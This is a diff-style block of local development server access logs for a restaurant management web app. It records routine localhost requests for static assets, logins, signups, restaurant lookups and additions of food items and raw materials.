+INFO:     127.0.0.1:42742 - "GET /_next/static/JgsTSqPmjhe_Wp3slkVLF/_buildManifest.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:42748 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42758 - "GET /_next/static/chunks/pages/V1/CardSelectionPage-9e1f9dceb8ad0b6c.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:42770 - "GET /_next/static/chunks/pages/V1/CouponPage-5276e27e6c31ed1e.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:42774 - "GET /_next/static/chunks/482-f4c289378f770d45.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:42782 - "GET /_next/static/chunks/pages/V1/RawMaterial-8c66674ba0aa161e.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:42784 - "GET /_next/static/chunks/pages/V1/EmployeeMgmtSystem-5e561efbbddaf88e.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:42798 - "GET /_next/static/chunks/pages/V1/AllReviewPage-cb24cb4156f4e09e.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:42806 - "GET /_next/static/chunks/312-2dde3ed767e4a1ce.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:42808 - "GET /_next/static/chunks/pages/V1/MyProfile-db16dc6129c7e94a.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:42818 - "GET /_next/static/chunks/613-df6395674591c160.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:42828 - "GET /_next/static/chunks/930-486bab2ae1df07d6.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:42832 - "GET /_next/static/chunks/pages/V1/Menu-0aa8f08326d1c725.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:42842 - "GET /_next/static/chunks/pages/V1/Recipe-d04657f0002f6255.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:42858 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42864 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42880 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42894 - "GET /food/getAllFoodItemsByRestaurant/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42910 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46484 - "GET /_next/static/chunks/pages/V1/RestaurantSignInPage-192227ab06b96f5b.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46500 - "POST /restaurantUser/restaurant_login HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46510 - "GET /restaurant/getRestaurantByUserId/12 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46522 - "GET /restaurant/getRestaurantByUserId/12 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46528 - "GET /restaurant/getRestaurantByUserId/12 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46536 - "GET /restaurant/getRestaurantByUserId/12 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46546 - "GET /restaurant/getRestaurantByUserId/12 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46558 - "GET /food/getAllFoodItemsByRestaurant/12 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46560 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48666 - "POST /food/addFoodItem HTTP/1.1" 500 Internal Server Error
+INFO:     127.0.0.1:48682 - "GET /restaurant/getRestaurantByUserId/12 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48698 - "GET /food/getAllFoodItemsByRestaurant/12 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48712 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47714 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53580 - "POST /restaurantUser/restaurant_login HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53596 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53608 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53614 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53620 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53632 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53646 - "GET /food/getAllFoodItemsByRestaurant/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53660 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56072 - "POST /restaurantUser/restaurant_login HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56076 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56090 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:43582 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:43598 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:43608 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:43616 - "GET /food/getAllFoodItemsByRestaurant/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:43620 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:43636 - "GET /foodRecipeSteps/recipe_steps/37 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:43626 - "GET /food/getRawMaterialsForFood/37 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59996 - "GET /_next/static/chunks/pages/_app-42a5a2918be03e75.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:60002 - "GET /_next/static/chunks/pages/V1/RestaurantSignInPage-192227ab06b96f5b.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:60016 - "GET /_next/static/JgsTSqPmjhe_Wp3slkVLF/_ssgManifest.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:60024 - "GET /_next/static/JgsTSqPmjhe_Wp3slkVLF/_buildManifest.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:42490 - "GET /_next/static/css/23ac19b4707a01d5.css HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42494 - "GET /_next/static/chunks/webpack-6ef43a8d4a395f49.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42508 - "GET /_next/static/chunks/framework-ecc4130bc7a58a64.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42520 - "GET /_next/static/chunks/main-f61746aa183f4a64.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42540 - "GET /_next/static/chunks/pages/V1/RestaurantSignInPage-192227ab06b96f5b.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42530 - "GET /_next/static/chunks/pages/_app-42a5a2918be03e75.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42550 - "GET /_next/static/JgsTSqPmjhe_Wp3slkVLF/_buildManifest.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42564 - "GET /_next/static/JgsTSqPmjhe_Wp3slkVLF/_ssgManifest.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42574 - "POST /restaurantUser/restaurant_login HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42578 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42580 - "GET /_next/static/chunks/4b358913-4923fb70bea84721.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42586 - "GET /_next/static/chunks/664-806b52bf69b97e98.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42590 - "GET /_next/static/chunks/358-0e5c8ffb23fe4a1d.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42594 - "GET /_next/static/chunks/86-a19cca599fd53215.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42604 - "GET /_next/static/chunks/140-effb0c232cf7d845.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42614 - "GET /_next/static/chunks/pages/V1/DashBoardPage-3cd8852957ef63a3.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42616 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42640 - "GET /_next/static/chunks/691-acdedb1a7f3c6410.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42630 - "GET /_next/static/chunks/675-45f9f7ae57ff0f95.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42646 - "GET /_next/static/chunks/530-81d8b5d9225e2fc4.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42660 - "GET /_next/static/chunks/pages/V1/CardSelectionPage-9e1f9dceb8ad0b6c.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42664 - "GET /_next/static/chunks/665-ef3f8ae02fc2a8ed.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42670 - "GET /_next/static/chunks/pages/V1/CouponPage-5276e27e6c31ed1e.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42674 - "GET /_next/static/chunks/482-f4c289378f770d45.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42688 - "GET /_next/static/chunks/940-c4e4b87d767c9895.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42702 - "GET /_next/static/chunks/312-2dde3ed767e4a1ce.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42716 - "GET /_next/static/chunks/613-df6395674591c160.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42746 - "GET /_next/static/chunks/pages/V1/Menu-0aa8f08326d1c725.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42732 - "GET /_next/static/chunks/930-486bab2ae1df07d6.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42750 - "GET /_next/static/chunks/76-f3e445fb2e009fff.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42754 - "GET /_next/static/chunks/pages/V1/RawMaterial-8c66674ba0aa161e.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42762 - "GET /_next/static/chunks/pages/V1/EmployeeMgmtSystem-5e561efbbddaf88e.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42772 - "GET /_next/static/chunks/pages/V1/AllReviewPage-cb24cb4156f4e09e.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42780 - "GET /_next/static/chunks/pages/V1/MyProfile-db16dc6129c7e94a.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42786 - "GET /_next/static/chunks/pages/V1/Recipe-d04657f0002f6255.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42790 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40244 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40260 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40276 - "GET /food/getAllFoodItemsByRestaurant/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40288 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52136 - "POST /restaurantUser/restaurant_login HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52138 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52150 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:38962 - "POST /restaurantUser/restaurant_login HTTP/1.1" 400 Bad Request
+INFO:     127.0.0.1:38978 - "POST /restaurantUser/restaurant_login HTTP/1.1" 400 Bad Request
+INFO:     127.0.0.1:38992 - "GET /_next/static/css/23ac19b4707a01d5.css HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:39000 - "GET /_next/static/chunks/webpack-6ef43a8d4a395f49.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:39004 - "GET /_next/static/chunks/framework-ecc4130bc7a58a64.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:39008 - "GET /_next/static/chunks/pages/V1/RestaurantSignUpPage-51be41ac8631d05d.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39024 - "GET /_next/static/chunks/main-f61746aa183f4a64.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:39028 - "GET /_next/static/chunks/pages/_app-42a5a2918be03e75.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:39030 - "GET /_next/static/JgsTSqPmjhe_Wp3slkVLF/_buildManifest.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:39040 - "GET /_next/static/JgsTSqPmjhe_Wp3slkVLF/_ssgManifest.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:47452 - "POST /restaurantUser/restaurant_signup HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47468 - "POST /restaurantUser/restaurant_signup HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47470 - "GET /_next/static/chunks/pages/V1/RestaurantSignInPage-192227ab06b96f5b.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:47486 - "POST /restaurantUser/restaurant_login HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47494 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47512 - "GET /_next/static/chunks/pages/V1/RestaurantImagePage-04c3f3a7ac4ecec6.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47504 - "GET /_next/static/chunks/675-45f9f7ae57ff0f95.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:47502 - "GET /_next/static/chunks/664-806b52bf69b97e98.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:47526 - "GET /punjabi.svg HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47536 - "GET /g.svg HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47538 - "GET /z.svg HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47550 - "GET /s.svg HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:51582 - "POST /restaurant/add_restaurant HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51596 - "GET /_next/static/chunks/4b358913-4923fb70bea84721.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:51610 - "GET /_next/static/chunks/86-a19cca599fd53215.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:51612 - "GET /_next/static/chunks/358-0e5c8ffb23fe4a1d.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:51628 - "GET /_next/static/chunks/140-effb0c232cf7d845.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:51644 - "GET /_next/static/chunks/pages/V1/DashBoardPage-3cd8852957ef63a3.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:51646 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51652 - "GET /_next/static/chunks/691-acdedb1a7f3c6410.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:51656 - "GET /_next/static/chunks/530-81d8b5d9225e2fc4.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:51664 - "GET /_next/static/chunks/pages/V1/CardSelectionPage-9e1f9dceb8ad0b6c.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:51672 - "GET /_next/static/chunks/665-ef3f8ae02fc2a8ed.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:51684 - "GET /_next/static/chunks/pages/V1/CouponPage-5276e27e6c31ed1e.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:51694 - "GET /_next/static/chunks/482-f4c289378f770d45.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:51702 - "GET /_next/static/chunks/940-c4e4b87d767c9895.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:51714 - "GET /_next/static/chunks/312-2dde3ed767e4a1ce.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:51720 - "GET /_next/static/chunks/613-df6395674591c160.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:51734 - "GET /_next/static/chunks/930-486bab2ae1df07d6.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:51750 - "GET /_next/static/chunks/pages/V1/Menu-0aa8f08326d1c725.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:51760 - "GET /_next/static/chunks/76-f3e445fb2e009fff.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:51764 - "GET /_next/static/chunks/pages/V1/RawMaterial-8c66674ba0aa161e.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:51778 - "GET /_next/static/chunks/pages/V1/EmployeeMgmtSystem-5e561efbbddaf88e.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:51784 - "GET /_next/static/chunks/pages/V1/AllReviewPage-cb24cb4156f4e09e.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:51794 - "GET /_next/static/chunks/pages/V1/MyProfile-db16dc6129c7e94a.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:51800 - "GET /_next/static/chunks/pages/V1/Recipe-d04657f0002f6255.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:51816 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51826 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51840 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51844 - "GET /food/getAllFoodItemsByRestaurant/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51852 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59118 - "POST /food/addFoodItem HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59126 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59134 - "GET /food/getAllFoodItemsByRestaurant/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59150 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46216 - "POST /restaurantUser/restaurant_signup HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46226 - "POST /restaurantUser/restaurant_login HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46228 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46234 - "GET /punjabi.svg HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46244 - "GET /g.svg HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46246 - "GET /z.svg HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46260 - "GET /s.svg HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47536 - "POST /restaurant/add_restaurant HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47544 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50296 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50298 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50304 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50314 - "GET /food/getAllFoodItemsByRestaurant/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50322 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36808 - "POST /food/addFoodItem HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36820 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36834 - "GET /food/getAllFoodItemsByRestaurant/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36840 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:35740 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41736 - "POST /food/addFoodItem HTTP/1.1" 400 Bad Request
+INFO:     127.0.0.1:41752 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41762 - "GET /food/getAllFoodItemsByRestaurant/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41774 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44700 - "POST /food/addFoodItem HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44714 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44722 - "GET /food/getAllFoodItemsByRestaurant/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44734 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:38614 - "GET /food/getRawMaterialsForFood/2 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:38616 - "GET /foodRecipeSteps/recipe_steps/2 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:57770 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57784 - "GET /rawMaterial/getAllRawMaterialsByRestaurant/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57792 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46222 - "POST /rawMaterial/addRawMaterial HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46228 - "GET /rawMaterial/getAllRawMaterialsByRestaurant/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46244 - "GET /_next/static/css/23ac19b4707a01d5.css HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46256 - "GET /_next/static/chunks/webpack-6ef43a8d4a395f49.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46266 - "GET /_next/static/chunks/framework-ecc4130bc7a58a64.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46278 - "GET /_next/static/chunks/main-f61746aa183f4a64.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46290 - "GET /_next/static/chunks/664-806b52bf69b97e98.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46304 - "GET /_next/static/chunks/pages/_app-42a5a2918be03e75.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46306 - "GET /_next/static/chunks/358-0e5c8ffb23fe4a1d.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46312 - "GET /_next/static/chunks/86-a19cca599fd53215.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46316 - "GET /_next/static/chunks/482-f4c289378f770d45.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46330 - "GET /_next/static/chunks/76-f3e445fb2e009fff.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46342 - "GET /_next/static/chunks/pages/V1/RawMaterial-8c66674ba0aa161e.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46356 - "GET /_next/static/JgsTSqPmjhe_Wp3slkVLF/_buildManifest.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46360 - "GET /_next/static/JgsTSqPmjhe_Wp3slkVLF/_ssgManifest.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46376 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46384 - "GET /_next/static/chunks/4b358913-4923fb70bea84721.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46378 - "GET /rawMaterial/getAllRawMaterialsByRestaurant/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46408 - "GET /_next/static/chunks/pages/V1/DashBoardPage-3cd8852957ef63a3.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46400 - "GET /_next/static/chunks/140-effb0c232cf7d845.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46440 - "GET /_next/static/chunks/675-45f9f7ae57ff0f95.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46452 - "GET /_next/static/chunks/691-acdedb1a7f3c6410.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46456 - "GET /_next/static/chunks/530-81d8b5d9225e2fc4.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46424 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46464 - "GET /_next/static/chunks/pages/V1/CardSelectionPage-9e1f9dceb8ad0b6c.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46480 - "GET /_next/static/chunks/665-ef3f8ae02fc2a8ed.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46484 - "GET /_next/static/chunks/pages/V1/CouponPage-5276e27e6c31ed1e.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46496 - "GET /_next/static/chunks/940-c4e4b87d767c9895.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46506 - "GET /_next/static/chunks/312-2dde3ed767e4a1ce.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46512 - "GET /_next/static/chunks/930-486bab2ae1df07d6.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46508 - "GET /_next/static/chunks/613-df6395674591c160.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46514 - "GET /_next/static/chunks/pages/V1/Menu-0aa8f08326d1c725.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46530 - "GET /_next/static/chunks/pages/V1/EmployeeMgmtSystem-5e561efbbddaf88e.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46532 - "GET /_next/static/chunks/pages/V1/AllReviewPage-cb24cb4156f4e09e.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:46536 - "GET /_next/static/chunks/pages/V1/MyProfile-db16dc6129c7e94a.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:58896 - "OPTIONS /restaurantUser/restaurant_login HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47620 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47630 - "GET /rawMaterial/getAllRawMaterialsByRestaurant/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47638 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34174 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34188 - "GET /rawMaterial/getAllRawMaterialsByRestaurant/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34204 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34218 - "GET /_next/static/chunks/pages/V1/RestaurantSignInPage-192227ab06b96f5b.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:34230 - "POST /restaurantUser/restaurant_login HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34238 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34252 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47216 - "GET /_next/static/chunks/pages/V1/Recipe-d04657f0002f6255.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:47222 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47228 - "GET /rawMaterial/getAllRawMaterialsByRestaurant/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47238 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50110 - "POST /rawMaterial/addRawMaterial HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50122 - "GET /rawMaterial/getAllRawMaterialsByRestaurant/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50130 - "GET /1/Home HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:50138 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:58174 - "POST /restaurantUser/restaurant_login HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58176 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58192 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58198 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58206 - "GET /rawMaterial/getAllRawMaterialsByRestaurant/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58212 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58218 - "GET /1/Home HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:45150 - "GET /_next/static/css/23ac19b4707a01d5.css HTTP/1.1" 200 OK
